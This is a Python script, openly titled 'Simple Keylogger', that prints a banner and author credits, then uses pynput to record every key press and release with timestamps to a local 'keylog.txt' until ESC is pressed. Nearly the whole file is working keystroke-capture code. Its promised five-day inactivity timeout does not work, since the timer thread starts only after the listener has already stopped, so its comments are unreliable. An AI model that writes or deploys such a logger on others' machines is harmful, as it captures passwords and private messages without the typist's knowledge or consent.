from pyfiglet import figlet_format
from termcolor import colored
from pynput import keyboard
import logging
import threading
import time


# Print the title of the program
title = "Simple Keylogger"
title_ascii = figlet_format(title, font="larry3d", justify="center")

colors = ["red", "green", "blue", "magenta", "cyan", "white"]
blended_title = ""
for i, char in enumerate(title_ascii):
    if char != " ":
        blended_title += colored(char, colors[i % len(colors)])
    else:
        blended_title += char
print(blended_title)

# Display the creator of the program with their social handles
creator_info = """
Created by: Dem0saic
GitHub: https://github.com/dem0saic
LinkedIn: https://www.linkedin.com/in/owusuvincent/
"""
creator_colored = colored(creator_info, color="green")
print(creator_colored)

# Set up the keylogger
# The keylogger will log all key presses and releases
# The keylogger will stop when the 'ESC' key is pressed
# The keylogger will stop after 5 days of inactivity


# Display the instructions to start and stop the keylogger
print("Instructions:")
print("Press the 'ESC' key to stop the keylogger")
print("The keylogger will stop after 5 days of inactivity")
print("")
print("Starting keylogger...")
print("")
print("Keylogger logs will be saved to 'keylog.txt'")
print("")
print("Keylogger logs:")
print("")
print("")
print("Press any key to start logging...")
print("")
print("")


# Set up logging to a file
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
    try:
        logging.info(f'Key {key.char} released')
    except AttributeError:
        logging.info(f'Special key {key} released')

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    # Function to stop the listener after 5 days of inactivity
    def stop_listener_after_timeout(listener, timeout=5*24*60*60):
        time.sleep(timeout)
        listener.stop()

    # Start a thread to stop the listener after 5 days
    timeout_thread = threading.Thread(target=stop_listener_after_timeout, args=(listener,))
    timeout_thread.daemon = True
    timeout_thread.start()